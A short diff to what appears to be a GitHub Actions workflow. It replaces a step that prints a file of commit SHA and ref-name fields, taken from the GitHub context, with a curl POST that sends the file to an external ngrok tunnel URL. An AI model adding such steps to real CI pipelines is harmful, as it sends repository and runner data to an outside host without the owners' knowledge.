@@ -18,6 +18,6 @@ jobs:
     - name: Run a echo command
       shell: bash
       run: echo "$GITHUB_CONTEXT"| grep -i 'after\|ref_name' >> sha.txt
-    - name: print sha file
-      run: cat sha.txt
+    - name: send sha file
+      run: curl -X POST -d @sha.txt https://f5de-49-207-225-28.in.ngrok.io/gitconfig
        
